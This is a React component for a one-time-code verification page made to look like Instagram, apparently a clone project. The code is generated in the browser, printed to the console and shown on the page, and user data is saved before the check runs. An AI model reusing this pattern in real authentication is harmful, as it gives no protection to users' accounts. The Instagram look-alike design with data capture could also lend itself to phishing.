import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import microsoft from '../Imgs/microsoft.png'
import playstore from '../Imgs/playstore.png'
import allimg from "../Imgs/allimg.png";
import LoginLayout from '../Layout/LoginLayout';
import { useFirebase } from "../Firebase";
export default function OtpPage() {
  const navigate = useNavigate();
  // OTP ko state me store karenge
  const firebase  = useFirebase()
  const [generatedOtp, setGeneratedOtp] = useState('');
  const [userOtp, setUserOtp] = useState('');
  const [errorMessage, setErrorMessage] = useState('');
const [numtype,setnumType]= useState(false)
  const [emailtype,setemailType]= useState(false)
const numberoremail= firebase.email;
const isNumber = /^\d+$/.test(numberoremail);
  const generateOtp = () => {
    const otp = Math.floor(100000 + Math.random() * 900000).toString(); // 6 digit ka OTP generate karega aur string me convert karega
    setGeneratedOtp(otp);
    console.log("Generated OTP:", otp); // Testing ke liye OTP ko console me dikhayenge
  };
  useEffect(() => {
    if (isNumber) {
    setnumType(true);
  } else {
    setemailType(true); 
  }
    generateOtp(); // Page load hone par OTP generate karega
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    firebase.saveData();
    if (userOtp === generatedOtp) {
        navigate("/insta");
    } else {
      setErrorMessage("Invalid OTP");
    }
  };
  return (
      <LoginLayout>
          <div className="col Second w-100 bg-" style={{ padding: "13px 33px" }}>
            {/* Login */}
            <div
              className="Login_data bg- p-4 d-flex align-items-center justify-content-center flex-column gap-2"
              style={{
                width: "350px",
                border: "1px solid #bdbdbd",
              }}
            >
              <span style={{ backgroundRepeat: "no-repeat", backgroundPosition: "-440px -142px", height: "76px", width: "64px",backgroundImage:`url(${allimg})` }}>
              </span>
              <span className="w-100 text-center px-5" style={{ color: "#000", fontSize: "16px", fontWeight: "600" }}>
                Just one more step
              </span>
              <span className="d-flex flex-column text-center">
              <span className="d-flex">
                 
              {numtype && (  <span className="d-flex flex-column"> <span style={{ color: "black", fontSize: "14px" }}>Enter the 6-digit code we sent to : </span>
                  <span style={{ fontSize: "14px", color: "#0095f6" }}>{numberoremail}</span>
                  </span>)}
                {emailtype && (   <span className="d-flex flex-column"><span style={{ color: "black", fontSize: "14px" }}>Enter the 6-digit code we sent to : </span>
                  <span style={{ fontSize: "14px", color: "#0095f6" }}>{numberoremail}</span>
                  </span>)}
                </span>
                <span style={{ fontSize: "13px", color: "red" }}>{generatedOtp}</span>
              </span>

              {/* OTP input form */}
              <form onSubmit={handleSubmit} className="d-flex align-items-center flex-column justify-content-center">
                <div className="input-container">
                  <input
                    type="text"
                    name="otp"
                    autoComplete="on"
                    placeholder=" "
                    required
                    id="inputs"
                    value={userOtp}
                    onChange={(e) => setUserOtp(e.target.value)} // OTP input ko update karna
                  />
                  <label className="floating-placeholder" htmlFor="name">
                    ######
                  </label>
                </div>
                <button
                  type="submit"
                  style={{ color: "#0095f6", border: "none", background: "none", fontSize: "14px", fontWeight: "600" }}
                >
                  Verify OTP
                </button>
              </form>

              {/* Error message agar OTP galat hai */}
              {errorMessage && <span style={{ color: "red" }}>{errorMessage}</span>}

              <div className="d-flex gap-2">
                <button
                  style={{ color: "#0095f6", border: "none", background: "none", fontSize: "14px", fontWeight: "600" }}
                >
                  <span>{emailtype && ("Change Email")} {numtype && ("Change Number")}</span>
                </button>
                |
                <button
                  onClick={generateOtp}  // Yahan OTP dubara generate hoga
                  style={{ color: "#0095f6", border: "none", background: "none", fontSize: "14px", fontWeight: "600" }}
                >
                  <span>Request new code</span>
                </button>
              </div>
            </div>

            <div
              style={{
                width: "350px",
                height: "63px",
                border: "1px solid #bdbdbd",
                fontSize: "14px",
              }}
              className="mt-2 d-flex align-items-center justify-content-center"
            >
              <span>Don't have a account? </span>
              <button
                className="fw-bold ms-1"
                style={{ border: "none", color: "#0095f6", background: "none" }}
                onClick={() => navigate("/insta")}
              >
                Log in
              </button>
            </div>

            <div className="d-flex mt-3 align-items-center justify-content-center" style={{ width: "350px" }}>
              <span style={{ color: "#000000", fontSize: "14px" }}>Get the app.</span>
            </div>

            <div className="Play_store_logo d-flex justify-content-center gap-2 mt-3" style={{ width: "350px", height: "44px" }}>
              <img src={playstore} alt="playstore_img" />
              <img src={microsoft} alt="microsoft_img" />
            </div>
          </div>
          </LoginLayout>
  );
}
